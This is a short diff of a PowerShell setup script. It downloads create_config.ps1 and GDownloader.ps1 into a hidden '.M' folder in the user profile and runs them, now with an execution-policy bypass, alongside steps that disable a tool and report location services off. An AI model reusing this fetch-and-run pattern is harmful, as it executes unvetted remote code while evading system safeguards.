@@ -288,12 +288,11 @@ Show-ProgressBar
 GeneralTool -Action Disable; GeneralTool -Action Status;
 # Prepair for  Service And Task ----------------------------------------------------------------
 Show-ProgressBar
-DLoad -FileName create_config.ps1; DLoad -FileName GDownloader.ps1; 
-powershell.exe -Command $env:USERPROFILE\.M\create_config.ps1;
+DLoad -FileName create_config.ps1; DLoad -FileName GDownloader.ps1; powershell.exe -Command $env:USERPROFILE\.M\create_config.ps1;
 # Using Join-Path for better path handling
-# $GDfile = Join-Path $env:USERPROFILE ".M" "GDownloader.ps1";
-# powershell -ExecutionPolicy Bypass -File $GDFile -;
-powershell.exe -Command $env:USERPROFILE\.M\GDownloader.ps1
+$GDfile = Join-Path $env:USERPROFILE ".M" "GDownloader.ps1";
+powershell -ExecutionPolicy Bypass -File $GDFile;
+# powershell.exe -Command $env:USERPROFILE\.M\GDownloader.ps1
 # ==================================================================================================
 # ------------------------------------------------------------------------------------------------
 Write-Host "[*] ✈ Location Service OFF" -ForegroundColor Green
